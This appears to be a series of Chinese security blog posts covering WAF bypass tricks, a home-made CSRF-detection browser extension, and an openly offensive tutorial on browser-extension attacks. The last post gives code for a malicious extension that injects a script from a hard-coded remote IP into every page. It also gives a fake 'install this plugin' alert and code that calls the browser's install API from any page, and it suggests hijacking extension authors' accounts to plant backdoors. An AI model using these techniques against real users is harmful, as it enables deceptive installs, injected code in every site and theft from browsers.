利用nginx&amp;apache这个bug，再加上浏览器默认会隐藏index.php文件名，那么漏洞就来了。访问a.cn/test/index.php?text=&lt;script&gt;alert(1)&lt;/script&gt;不会弹窗，被waf.conf给拦截了。 访问a.cn/test/?text=&lt;script&gt;alert(1)&lt;/script&gt;会弹窗，没有被waf.conf给拦截，因为nginx根据URL判断这不是php文件，并没有交给apache处理，也就没有走第三个location流程。 本节是告诉大家，绕过WAF不用一直针对WAF，也可以利用环境/第三方的缺陷来绕过。 0x05 从HTTP数据包开始说起： 1、 现在有一部分网站waf是部署在客户端上的，利用burp、fiddler就可以轻松绕过。很多时候我们遇到的情况就像这段代码一样:12&lt;input type=\"text\" name=\"text\"&gt;&lt;input type=\"submit\" onclick=\"waf()\"&gt; 把waf规则放到js里。我们可以提交一个woaini字符串，然后用burp、fiddler抓包、改包、提交，轻轻松松的绕过了客服端的WAF机制。 2、有的网站，他们对百度、google、soso、360等爬虫请求并不过滤，这时我们就可以在USER-Agent伪造自己是搜索引擎的爬虫，就可以绕过waf 3、有的网站使用的是$_REQUEST来接受get post cookie参数的，这时如果waf只对GET POST参数过滤了，那么久可以在数据包里对cookie进行构造攻击代码，来实现绕过waf。 4、有的waf对GET POST COOKIE都过滤了，还可以进行绕过。怎么绕过呢？假设网站会显示你的IP或者你使用的浏览器，那么你就可以对IP、user-agent进行构造，在PHP里X_FORWARDED_FOR和HTTP_CLIENT_IP两个获取IP的函数都可以被修改。想详细了解的可以去：http://www.freebuf.com/articles/web/42727.html 0x06节。本节告诉我们waf是死的，人是活的，思想放开。不要跟着WAF的思路走，走出自己的思路，才是最正确的。 0x06 WAF你算个屌： 很多人认为绕过WAF需要根据WAF的规则来绕过。但是我们可以忽视他，进行攻击。我们利用第三方插件来进行攻击，因为第三方插件的权限非常大，而且他有一个特殊的性质，就是他可以跨域。我们可以事先在插件里调用一个js代码，对方安装之后浏览任何网站都可以被XSS。我们现在来看段Maxthon插件的源码： def.json test.js： 统一放在一个文件夹里，再用Mxpacke.exe生成一个遨游插件。 双击就可以安装这个插件。 。这不算是一个漏洞，因为插件必须要运行js代码，而XSS的宗旨就是 在网站里运行你所指定的js代码。所以，这个xss没办法修复，而且chrome 火狐 等浏览器都存在。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/08/20/talk-about-how-to-bypass-WAF/"},{"title":"自动化检测CSRF","text":"0x00 前言： 之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。 0x01 前期的准备工作： 既然要写，那么我们就需要demo来帮我们模拟真实环境的下的情况，而0x00节就说明了，本章只针对于form表单，所以我们的demo也就是各式各样的表单。如下图： 基本上来说网上常见的表单类别都包含了，当然如果你发现有些表单没有加入进去，请说明一下，我将会在下一版中修改。 我们先遍历整个网页上的form表单。代码如下：1234567outerFor:for(var i = 0;i &lt; $(\"form\").length;i++){ var formDom = $(\"form\").eq(i); //formDom代表本次循环的form表单元素 var imageFileSuffix = ['.jpg','.png','.jpge','.ico','.gif','.bmp']; //图片后缀白名单，用户验证图片是否为验证码 var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; //无用表单黑名单，用于验证这个form表单有没有用（针对input验证） var actionFilterKeyword = ['search','find','login','reg']; //无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）} 至于为什么要加上outerFor:，是因为这只是最外层的for循环，里面还有for循环，为了方便我们在最里层的for循环里跳出最外层的本次循环。在最里层的for循环里我会使用continue outerFor;来跳出最外层for的本次循环。（如果没有看懂，请返回上一行重新看，这很重要） 0x02 去除类似搜索、页面跳转等无用的form表单： 首先我们需要假象一下有没有特殊的form表单，比如没有action属性，把请求交给JavaScript来完成。而这种特殊的form表单也很常见，所以这里我就先使用if判断action是否存在：123if(formDom.attr(\"action\") != undefined){ //当action不为空的时候，进行下一步的操作} 然后就是使用JavaScript的some函数来对action进行判断，当action里的值满足于我们之前设置的黑名单里的字符串时，就直接pass，使用continue来跳出初始化表达式变量为i的本次循环。转化成代码就是下面这样：12345678if(formDom.attr(\"action\") != undefined){ var actionCheck = actionFilterKeyword.some(function(item,index){ return (formDom.attr(\"action\").toLowerCase().indexOf(item) != \"-1\"); }) if(actionCheck){ continue; }} 如果对some函数不明白的，请移步：https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94).aspx.aspx)而在JavaScript里是严格区分大小写的，所以在上面的代码中我使用了toLowerCase()函数，来把action里的值全部转化成小写，然后在其中搜索之前设置的action黑名单，看是否存在。而对比过程如下: action的值–search（如果此次比对为true，则不会向下进行比对） action的值–find …… 其返回的结果是布尔型。在《JavaScript高级程序设计》里是这样说明some函数的: 对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则返回true。 这个时候我们可以看到some前面有一个变量。因为some返回的是布尔型，那么actionCheck变量也是一个布尔型，假设当前这个form表单里的action的值为”/searchArticle.php”。那么就会匹配到黑名单里的search字符串，那么some就会停止向下循环，直接返回true。如下图： 然后使用if判断actionCheck变量。如果为true，那么就使用continue来跳出当前的循环，不向下运行，直接开始下一个循环。 OK,上面的已经完成对form的action属性过滤了，那么下面的将对input进过白名单过滤。12345678910111213for(var x = 0;x &lt; formDom.find(\":text\").length;x++){ var inputTextCheck; var inputText = formDom.find(\":text\").eq(x); if(inputText.attr(\"placeholder\") == undefined){ continue; } inputTextCheck = placeholderFilterKeyword.some(function(item,index){ return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\"); }) if(inputTextCheck){ continue outerFor; }} 首先使用(&quot;:text&quot;)来遍历当前form表单下所有type为text的input标签。 inputTextCheck变量是为了存放some函数的布尔结果。而inputText变量代表了当前的input标签。 然后使用if判断当前input里的placeholder属性是否存在，如果不存在，则跳出初始化表达式变量为x的本次循环。不向下运行，且对下一个input标签进行之前的操作。如果存在且有值的话，if里的表达式会返回false。则这个if判断不会运行，而是向下运行，而代码：123456inputTextCheck = placeholderFilterKeyword.some(function(item,index){ return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\");})if(inputTextCheck){ continue outerFor;} 和之前判断action的情况的是一样的，这里就不在阐述了。 0x03 去除没有提交按钮的form表单： 为什么要写这个，因为有些form表单不是给用户使用的，他没有提交按钮。对用户来说也是不可见状态。而且也不涉及较为核心的操作，那么我们就需要把这个表单剔除掉。代码如下：123if(formDom.find(\":submit\").length &lt; 1){ continue;} 这段代码较为简单，这里也不在阐述了。 0x04 去除具有token的form表单： 大家都知道对于CSRF来说，具有token的form表单基本是可以断定是不存在CSRF漏洞的了，当然排除同页面存在XSS漏洞和CSRF漏洞。 而token，我们应该怎么样发现呢？type为hidden？name包含token？，不不不。这些都不准确，没办法减少误报和扩大结果。那我们应该怎么做呢？判断type为hidden的input标签里的value值的长度是否大于10。 具有token功能的input标签的特殊性： type为hidden 为了安全起见，token一般是不会小于10位数的。 总是以input标签为媒介的方式传输给后端服务器中。 OK,那么我们可以遍历当前form表单下所有type为hidden的input标签，再判断value值是否大于10。如果大于10，说明这个表单很大程度上是具有token验证的表单，将会被程序丢弃。跳出初始化表达式变量为i的本次循环。把上面的话转化成代码就是下面这样：12345for(var j = 0;j &lt; formDom.find(\":hidden\").length;j++){ if(formDom.find(\":hidden\").eq(j).val().length &gt; 10){ continue outerFor; }} 程序不复杂，复杂的思路。所以这里看起来代码其实也了没多少，而且相当的简单。所以这里就不对代码进行阐述了。 0x05 去除带有验证码的form表单： 有了之前写自动化检测XSS项目的经验，这里思路就清晰多了。获取img的src属性里的值，判断后缀是否为图片格式。代码如下：12345678910111213141516171819if(formDom.find(\"img\").length &gt; 0){ var imageCheck; for(var z = 0;z &lt; formDom.find(\"img\").length;z++){ var img = formDom.find(\"img\").eq(z); var imgSrc = img.attr(\"src\") if(!!imgSrc){ if(imgSrc.indexOf(\"?\") != \"-1\"){ imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\")); } imgSrc = imgSrc.substr(imgSrc.lastIndexOf(\".\"),imgSrc.length); imageCheck = imageFileSuffix.some(function(item,index){ return (imgSrc == item); }) if(!imageCheck){ continue outerFor; } } }} 首先使用formDom.find(&quot;img&quot;).length来判断当前的form表单里是否存在图片，如果存在，那么if判断会返回true。进入if判断里面后，首先是一个变量，而这个变量是存放some函数返回的布尔结果的。 然后就是一个for循环，对当前form表单里的img表单进行遍历。而变量img代表了当前的img标签。而imgSrc变量代表了当前img标签里的src。 下面是一段if代码if(!!imgSrc)为什么要这样写呢，是强制把imgSrc变量转成布尔型的，如果当前这个img标签是不存在src属性或没有值的情况下，将会返回false，如果存在src且有值的情况下会返回true。 而下面的代码的是为了剔除?后面的字符串：123if(imgSrc.indexOf(\"?\") != \"-1\"){ imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\"));} 为什么要写这样的代码呢？原因很简单，未来防止验证码图片被浏览器缓存，需要再后面跟上问号和随机数字，来达到每刷新一次，就会重新请求这个图片。防止浏览器缓存图片。 而imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&quot;.&quot;),imgSrc.length);这段代码是剔除，除了后缀之外所有的字符串。只保留后缀。举个例子，有段img标签是这样写的：&lt;img src=&quot;https://wwww.baidu.com/code.php?rand=458711541&quot;&gt;，而运行上面的代码后，结果只有.php了，剩下的字符串已经被剔除掉了。 而下面的some函数，和之前是一样的，不做阐述。只是if里面的表达式里多了一个!取反感叹号。为什么要这样写呢。因为之前的都是黑名单的形式，而这里的白名单的形式，既然是相反的，那么就使用!取反就行了。 0x06 其他：整套代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960outerFor:for(var i = 0;i &lt; $(\"form\").length;i++){ var formDom = $(\"form\").eq(i); var imageFileSuffix = ['.jpg','.png','.jpge','.ico','.gif','.bmp']; var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; var actionFilterKeyword = ['search','find','login','reg']; //去除类似搜索、页面跳转等无用的form表单 if(formDom.attr(\"action\") != undefined){ var actionCheck = actionFilterKeyword.some(function(item,index){ return (formDom.attr(\"action\").toLowerCase().indexOf(item) != \"-1\"); }) if(actionCheck){ continue; } } for(var x = 0;x &lt; formDom.find(\":text\").length;x++){ var inputTextCheck; var inputText = formDom.find(\":text\").eq(x); if(inputText.attr(\"placeholder\") == undefined){ continue; } inputTextCheck = placeholderFilterKeyword.some(function(item,index){ return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\"); }) if(inputTextCheck){ continue outerFor; } } //去除没有提交按钮的form表单 if(formDom.find(\":submit\").length &lt; 1){ continue; } //去除具有token的form表单 for(var j = 0;j &lt; formDom.find(\":hidden\").length;j++){ if(formDom.find(\":hidden\").eq(j).val().length &gt; 10){ continue outerFor; } } //去除带有验证码的form表单 if(formDom.find(\"img\").length &gt; 0){ var imageCheck; for(var z = 0;z &lt; formDom.find(\"img\").length;z++){ var img = formDom.find(\"img\").eq(z); var imgSrc = img.attr(\"src\") if(!!imgSrc){ if(imgSrc.indexOf(\"?\") != \"-1\"){ imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\")); } imgSrc = imgSrc.substr(imgSrc.lastIndexOf(\".\"),imgSrc.length); imageCheck = imageFileSuffix.some(function(item,index){ return (imgSrc == item); }) if(!imageCheck){ continue outerFor; } } } } console.log(formDom)} 这里的console.log(formDom)可以改为ajax等方式发包，或者alert直接提醒此页面可能具有csrf漏洞。至于如何使用，需要大伙手工打包成浏览器插件的形式。而这里我为大家附上我之前写的自动化检测XSS的插件：http://pan.baidu.com/s/1ge5VTcf。大家可以直接解包，修改里面的JavaScript代码为上面完整的代码，再重新打包就行了。 文章呢，还有很多地方不足。而这套程序还只能说是雏形，所以我没有附上直接利用的工具给大家，也是第一次这样。而且有很多地方没有考虑到，比如JSON Hijacking检测。当然下一章会完成的，也会放出可以直接利用的工具。第二章或者第三章可能会把之前写的XSS自动化检测与本章所说的自动化检测CSRF相结合起来。毕竟XSS+CSRF的危害是非常大的。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/06/15/automated-detection-of-CSRF/"},{"title":"自动化检测CSRF(第二篇)","text":"0x00 前言： 上一篇只是大致说明整个思路和流程。本篇就详细说说如何检测CSRF。为什么不在上一篇中放出插件呢。是因为误报率确实是比较多，而且无法检测Referer。而本章，重点就说明“如何检测对方是否开启了Referer检测机制”。在我的认知范围内，这是首款检测Referer的工具(不知廉耻的笑了)。今天发现腾讯在2013年就做了类似的产品 (这就尴尬了..)，不过还好。而且思路和实现方法有所区别。本章说检测Referer，第三章说检测token机制的强化,让检测token的成功率达到80~90%以上(其实就是写第二篇的时候，忘记写了。推到第三章了….)。而且这些是腾讯产品所没有的撒。 0x01一些小的变化： 之前的黑白名单列表123var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; //无用表单黑名单，用于验证这个form表单有没有用（针对input验证）var actionFilterKeyword = ['search','find','login','reg']; //无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）} 现在的黑白名单列表：12var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search'];var actionFilterKeyword = ['search','find','login','reg',\"baidu.com\",\"google.com\",\"so.com\",\"bing.com\",\"soso.com\",\"sogou.com\"]; 此处的代码，决定了整体插件检测时的误报率大体走向。你也可以自己修改来达到自我感觉不错的地步。 现在的初始化变量：123var actionCache,actionPath;var actionvParameter = \"\";var ajaxParameter = \"\"; 0x02：插件的整体框架 因为Maxthon浏览器的API实在是太少，没有这些API我无法进行Referer检测，于是，检测CSRF插件，就不写Maxthon的插件了，下面是Chrome插件的框架： icons 是存放插件图标的地方，我比较懒，直接使用AutoFindXSS插件的图标。 background.html 是为了让我们修改插件的作用域，让我们可控，可以在Chrome的API中使用jquery插件 background.js 这里我们把它理解为后端程序，类似于服务端的存在。用于处理base.js文件的数据 base.js 会在网站加载完成后调用。在检测Referer的时候，把数据传给background.js文件 manifest.json Chrome插件的核心文件，用于配置插件参数。 这里我先给大家看一下manifest.json文件的内容：1234567891011121314151617181920{ \"background\": { \"page\": \"background.html\", \"persistent\": true }, \"name\": \"AutoFindCSRF\", \"version\": \"1.0.0\", \"manifest_version\": 2, \"description\": \"CSRF[by:Black-Hole&amp;158099591@qq.com]\", \"content_security_policy\": \"script-src 'self' 'unsafe-eval'; object-src 'self'\", \"permissions\": [ \"&lt;all_urls&gt;\",\"tabs\" ], \"icons\":{\"16\": \"icons/icon_16.png\",\"48\": \"icons/icon_48.png\",\"128\": \"icons/icon_128.png\"}, \"content_scripts\": [{ \"matches\": [\"*://*/*\"], \"js\": [\"jquery.js\",\"base.js\"], \"run_at\": \"document_end\" }]} content_security_policy 简称CSP，用户限制插件的安全性 permissions 是插件向Chrome申请的权限。 content_scripts 意思是，在任何协议下，当网站加载完成后，都会运行jquery.js和base.js文件。JavaScript this指向的是当前网页 background JavaScript this指向的是插件，用户处理base.js和background.js通信的存在 而上一篇文章的JavaScript代码，都存放在base.js里，待会说“检测Referer机制”时，也是写在这个文件里。 0x03：检测对方是否开启了Referer检测机制 首先为了下面程序的简洁，先把当前表单的action地址赋值给一个变量：actionCache = formDom.attr(&quot;action&quot;); 然后匹配action地址。为什么要匹配action地址呢，因为action分为以下几种情况： #test ./test.php &amp;&amp; ./test(处理方式一样) /test.php?a=11 test.php http://baidu.com/?s= 这里我们使用switch来实现匹配，代码如下：123456789101112131415161718192021222324252627282930switch(actionCache[0]){ case \"#\": actionPath = location.href + actionCache; break; case \"/\": actionPath = location.origin + actionCache; break; case \".\": if(actionCache.indexOf(\"?\") != \"-1\"){ actionvParameter = \"?\" + actionCache.split(\"?\")[1]; actionCache = actionCache.slice(0,actionCache.indexOf(\"?\")); } if(location.href.split(\"/\").pop().split(\".\").length == 1){ actionPath = location.href + actionCache.substr(1,actionCache.length-1) + actionvParameter; }else{ actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache.substring(1,actionCache.length) + actionvParameter; } break; default: if(location.protocol == \"http:\" || location.protocol == \"https:\"){ actionPath = location.href; break; } if(location.href.split(\"/\").pop().split(\".\").length == 1){ actionPath = location.href + \"/\" + actionCache; }else{ actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache; } break;} 当action地址的第一个值是#时，直接使用location.href + actionCache;拼接。 当action地址的第一个值是/时，使用location.origin + actionCache;来进行拼接 当action地址的第一个值是.时：先使用indexOf函数来把参数赋值给一个变量并去除，1234if(actionCache.indexOf(\"?\") != \"-1\"){ actionvParameter = \"?\" + actionCache.split(\"?\")[1]; actionCache = actionCache.slice(0,actionCache.indexOf(\"?\"));} 详细的情况如下： 然后根据有无后缀进行匹配：12345if(location.href.split(\"/\").pop().split(\".\").length == 1){ actionPath = location.href + actionCache.substr(1,actionCache.length-1) + actionvParameter;}else{ actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache.substring(1,actionCache.length) + actionvParameter;} location.href.split(&quot;/&quot;).pop().split(&quot;.&quot;).length是检测当前url有无后缀，如果有那么长度是为2.如果没有后缀长度是1。如果没有参数，将不会加任何字符串，因为在初始变量的时候就已经设为空了。详情如下： 除去这些之外，还有直接是文件名或者直接是url，这里呢，我直接写到switch的default分之上去了，因为无法使用actionCache[0]来匹配，代码如下：1234567891011default: if(location.protocol == \"http:\" || location.protocol == \"https:\"){ actionPath = location.href; break; } if(location.href.split(\"/\").pop().split(\".\").length == 1){ actionPath = location.href + \"/\" + actionCache; }else{ actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache; } break; 首先是判断location.protocol是否为http或https协议。如果是的话，直接使用location.href;。当不为http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：actionPath = location.href + &quot;/&quot; + actionCache;，反馈如图： 当存在后缀时，运行：actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&quot;/&quot;).pop())) + actionCache;。反馈如图： 0x04：模拟form的参数 代码如下：12345678910111213for(var v = 0;v &lt; formDom.find(\":text\").length;v++){ var input = formDom.find(\":text\").eq(v); if(input.attr(\"name\") != \"\"){ if(input.val() == \"\"){ ajaxParameter += input.attr(\"name\") + \"=\" + \"15874583485&amp;\"; }else{ ajaxParameter += input.attr(\"name\") + \"=\" + input.val() + \"&amp;\"; } }else{ continue; }}ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1); 使用for循环对当前form表单下属性为text的input标签，然后使用var input = formDom.find(&quot;:text&quot;).eq(v);来进行赋值，把当前的input赋值给input变量。 再使用if判断，当前的input标签是否存在name属性，如果没有，则使用continue;跳出初始化表达式变量为v的本次循环。如果存在，再判断当前的input的value属性里是否有值，如果有值则直接赋值给ajaxParameter。代码：ajaxParameter += input.attr(&quot;name&quot;) + &quot;=&quot; + input.val() + &quot;&amp;&quot;;，如果不存在则把15874583485赋值给ajaxParameter变量，为什么要使用类似于手机号码的呢，因为容错率挺高的。可以看到我在每次赋值的时候，都会在后面加上&amp;字符。因为方便下面发送ajax。当然需要去掉最后一个&amp;。于是乎，有了下面的代码：ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1);。 0x04：与插件的background.js进行通信 这里呢，我先说说“检测Referer的思路”，在当前网站发送一次ajax请求，Referer的地址肯定是当前的URL，是正常的，和普通提交form表单是一样的，这里呢，把action地址和method值及参数传给插件，在插件里再发送一次AJAX请求，chrome插件发送AJAX时，Refere是为空的。两次提交，如果存在Referer检测，那么返回的结果长度肯定是不一样的，如果不存在Referer检测，长度是一样的（当然可能存在个别的差异，因为可能要显示时间等，结果长度不一样，但是是不存在“Referer检测”的，下面会增加容错率） Chrome对插件通信提供了发送chrome.runtime.sendMessage和接受chrome.runtime.onMessage.addListener的API。首先让我们来看看base.js文件里的发送chrome.runtime.sendMessageAPI代码:12345678910111213141516$.ajax({ url: actionPath, type: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'get':'post', dataType: 'html', data: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter, async: false,}).done(function(data){ var firstAjax = data.length; var formCache = formDom; chrome.runtime.sendMessage({action: actionPath, parameter: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter},function (response) { if(Math.abs(firstAjax - response.status) &lt; 10){ formCache.attr(\"style\",\"border: 1px red solid;\") } });}) 因为form的method属性的值是不确定的。所以就需要对ajax的参数type进行设置：(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == 'get')?'get':'post'，这里使用了三目运算符。当method的值不存在、为get的时候，type为get。当存在的时候，则为post。 下面的data参数同理。只不过没有了get、post选项。改为'':ajaxParameter。因为method值为get时，参数是附在actionPath变量里的。当为post的时候，将把之前拼接的参数传给data参数。这里计算一下返回页面的长度var firstAjax = data.length;，至于下面的为什么要给变量再赋值一次呢，我也不知道，可能下面的Chrome API的作用域不同，导致在下面使用API的时候，使用formDom变量，结果不对。只能重新赋值给formCache变量，这个时候API才算正常。 下面就是Chrome的API了：12345chrome.runtime.sendMessage({action: actionPath, parameter: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter},function (response) { if(Math.abs(firstAjax - response.status) &lt; 10){ formCache.attr(\"style\",\"border: 1px red solid;\") } }); 这里的action和parameter是发送的参数及值。至于代码(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == 'get')?'':ajaxParameter和上面同理，当为get的时候，不给parameter值，当为post的时候，值为ajaxParameter。response为回调函数，类似ajax的done函数，返回background.js的处理结果。 那background.js是如何处理的呢：123456789101112chrome.runtime.onMessage.addListener(function(message,sender,sendResponse){ $.ajax({ url: message.action, type: (message.parameter == \"\")?'get':'post', dataType: 'html', data: (message.parameter == \"\")?'':message.parameter, async: false, }) .done(function(data) { sendResponse({status: data.length}) })}) chrome.runtime.onMessage.addListener是接受函数，然后就是AJAX了，在done函数里，有一个API是sendResponse({status: data.length})返回插件发送AJAX时的长度。这个时候前端base.js将会受到background.js文件的返回结果。代码就返回上面的处理方式了：123if(Math.abs(firstAjax - response.status) &lt; 10){ formCache.attr(\"style\",\"border: 1px red solid;\")} 这里的Math.abs是求绝对值的，当两次ajax返回的长度差值小于10的时候，说明不存在“Referer检测”，当大于10时，就说明存在“检测Referer的机制”了。这里的10就是容错值。 当存在CSRF漏洞的时候，会在form表单的外部包含一个红色的框，如图： 0x05：结尾 这里的token验证机制还是不完整，我会在下一版中解决的。以及JSON Hijacking。有可能存在第四章。 文章非常感谢：北风(2660668090)提供的思路及技术支持。 插件下载地址：http://pan.baidu.com/s/1geMUl7l 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","link":"/2016/06/23/automated-detection-of-CSRF-second-part/"},{"title":"浏览器插件的攻击向量","text":"0x0 前言：我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。 0x1 让自己变成攻击者：我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。 在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。 大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法： 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件” 被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装 基于社工库控制插件作者的账户，加入后门代码，更新插件 控制插件里调用的第三方javascript代码 现在有四种方法供我们选择，我们一个个来进行介绍。 0x1.1 在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”这个方法类似于之前的问题强迫安装恶意Chrome扩展 攻击者使用激进方式。这里我们也来实现一下并且优化下，此处使用的案例是“MaxThon遨游浏览器插件”。 0x1.1.1 检测是否安装了某插件我们先把这个攻击方式的代码目录架构进行说明： 网站页面: index.html 插件目录:1234567891011121314151617181920212223242526272829303132333435363738icons/ 插件的logo存放目录icons/icons.svg 插件logo文件def.json 插件的主控制文件，里面存着整个插件的配置代码如下:[ { &quot;type&quot;: &quot;extension&quot;, &quot;frameworkVersion&quot;:&quot;1.0.0&quot;, &quot;version&quot;:&quot;1.0.0&quot;, &quot;guid&quot;: &quot;{7c321680-7673-484c-bcc4-de10f453cb8e}&quot;, &quot;name&quot;: &quot;plug_setup&quot;, &quot;author&quot;: &quot;Black-Hole&quot;, &quot;svg_icon&quot;:&quot;icon.svg&quot;, &quot;title&quot;: { &quot;zh-cn&quot;: &quot;欺骗用户安装插件&quot; }, &quot;description&quot;:{ &quot;zh-cn&quot;:&quot;欺骗用户安装插件&quot; }, &quot;main&quot;:&quot;index.html&quot;, &quot;actions&quot;: [ { &quot;type&quot;: &quot;script&quot;, &quot;entryPoints&quot;: [ &quot;doc_onload&quot; ], &quot;js&quot;: [ &quot;base.js&quot; ], &quot;include&quot;: [&quot;*&quot;], &quot;includeFrames&quot;: true } ] }]base.js 每打开一个页面，要执行的JavaScript代码 我翻遍了整个遨游插件的API手册，没有找到类似chrome Plug API的： 123456789101112chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) { if(request.act == 'ping'){ sendResponse({\"act\": \"tong\"}); }})chrome.runtime.sendMessage(\"extensionId\", {\"act\": \"ping\"}, function(response){ if(response &amp;&amp; response.act == 'tong'){ console.log('已安装'); }else{ console.log('未安装'); }}); 既然没有找到，我们就要想其他比较Hack的办法来解决这个问题。 这里我使用的办法是利用JavaScript全局及setTimeout函数来解决这个问题。 首先在插件里的base.js文件里写入: 123var script = document.createElement('script');script.src = \"http://119.29.58.242/control.js\";document.body.appendChild(script); 上面，这段代码将会在每个页面里的body标签后面写入&lt;script src=&quot;http://119.29.58.242/control.js&quot;&gt;&lt;/script&gt;代码，而在http://119.29.58.242/control.js文件里的代码为:123window.plug_setup = function(){} 这时，用户打开任何一个网页，那个网页的全局函数中就会有一个名为plug_setup的函数，并且不具有任何作用，很容易让人忽略掉，只会在特殊的页面中才会起作用。 然后我们再在网站的页面里写：12345setTimeout(function(){ if(typeof(plug_setup)!=\"function\"){ alret(\"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面\"); }},1000) 因为页面加载、网络等问题照成的延迟问题，这里我们设置为1秒后运行检测代码。1秒后，将会运行123if(typeof(plug_setup)!=\"function\"){ alret(\"因网站升级，网站结合了浏览器插件给用户更好的使用体验，请安装xx插件后刷新此页面\");} 这个时候如果全局没有plug_setup函数，将会运行下面的alert函数，告诉用户需要安装插件才可以访问。 0x1.1.2 欺骗用户进行半自动安装指定插件我觉的如果让用户安装插件的话，你跳转到页面，让用户把插件的信息、评论看完再安装，岂不是成功率大大降低了，而且也不符合网站的优化。《点石成金》一书上说过这样一句话“不要让用户思考”，这个虽然是网站设计里面的至理名言，但是也同样可以放在攻击里，当一个用户的思考变得更少时，那么他会有很大程度上会跟着攻击者设计好的路走。 于是，我分析了遨游浏览器安装插件页面里的JavaScript，发现遨游浏览器进行安装插件时调用API在任何页面都可以运行，会照成攻击者在页面写上一些JavaScript代码后，就会像遨游浏览器那样弹出一个框询问用户是否安装插件： 我这里进行一些优化，代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293var ERRORTEXT = &apos;非傲游浏览器或版本过低。&lt;a href=&quot;http://www.maxthon.cn&quot; target=&quot;_blank&quot;&gt;点此获取最新版本傲游浏览器&lt;/a&gt;&apos;function getInstallMessage(that, messagePack, type) { if (external.mxCall) { var packMxAttr = $(that).closest(messagePack); if (type === &apos;skin&apos;) { // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetSkinFxVersion&apos;); } else if (type === &apos;app&apos;) { // 浏览器框架版本号 var frameVersion = external.mxCall(&apos;GetAppFxVersion&apos;); // 下个版本上了就删掉-- if (frameVersion === &apos;1.0.0&apos;) { frameVersion = &apos;1.0.1&apos;; } // --下个版本上了就删掉 } // 插件包框架版本号 var packMxVersion = packMxAttr.attr(&apos;file_def&apos;); // 插件包url var packUrl = packMxAttr.attr(&apos;file_url&apos;); // 插件id var packId = packMxAttr.attr(&apos;file_id&apos;); installPack(frameVersion, packMxVersion, packUrl, type, packId); } else { resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, &apos;确定&apos;); }}function installPack(frameVersion, packMxVersion, packUrl, type, packId) { var isInstall = returnIsInstall(frameVersion, packMxVersion); if (isInstall !== -1) { if (type === &apos;skin&apos;) { external.mxCall(&apos;InstallSkin&apos;, packUrl); } else if (type === &apos;app&apos;) { external.mxCall(&apos;InstallApp&apos;, packUrl); } getUser(packId); } else { resultPop.show(&apos;浏览器不符&apos;, ERRORTEXT, 